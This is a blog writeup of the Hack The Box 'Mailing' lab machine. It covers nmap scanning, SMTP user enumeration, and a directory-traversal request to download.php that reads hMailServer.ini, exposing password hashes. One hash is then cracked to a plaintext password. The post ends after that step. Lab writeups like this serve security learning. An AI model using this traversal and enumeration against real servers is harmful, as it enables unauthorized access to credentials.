---
layout: post
title: writeup
subtitle: Hack the box mailing machine writeup
category: writeup
thumbnail-img: /assets/img/hackfes.jpeg
tags: [writeup, hackthebox, mailing, OSCP, windows]
author: Hong
---
# nmap
```
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 IDLE CHILDREN IMAP4rev1 CAPABILITY completed SORT OK NAMESPACE RIGHTS=texkA0001 QUOTA ACL
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: IMAP4 IDLE CHILDREN IMAP4rev1 CAPABILITY completed SORT OK NAMESPACE RIGHTS=texkA0001 QUOTA ACL
|_ssl-date: TLS randomness does not represent time
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -9m30s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-23T05:01:06
|_  start_date: N/A

```
I added mailing.htb domain to /etc/hosts file.  
But it looks web server is not running..  

# smtp enumertaion
`smtp-user-enum -m RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt 10.10.11.14 25 -d "mailing.htb"`
```
[SUCC] root          250 OK
[SUCC] admin         250 OK
[SUCC] test          250 OK
[SUCC] guest         250 OK
[SUCC] info          250 OK
[SUCC] adm           250 OK
[SUCC] mysql         250 OK
[----] user          550 Account is not active.
[SUCC] administrator 250 OK
[SUCC] oracle        250 OK
[SUCC] ftp           250 OK
[SUCC] pi            250 OK
[SUCC] puppet        250 OK
[SUCC] ansible       250 OK
[SUCC] ec2-user      250 OK
[SUCC] vagrant       250 OK
[SUCC] azureuser     250 OK
```
Found users.  
# Web enumeration
In the burp, there is download link and I found it is vulnerable to LFI.  
image here   
`GET /download.php?file=../../../../Program+Files+(x86)\hMailServer\Bin/hMailServer.ini `  
```
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```
I found the value for the hash from [here](https://crackstation.net/)  
- homenetworkingadministrator
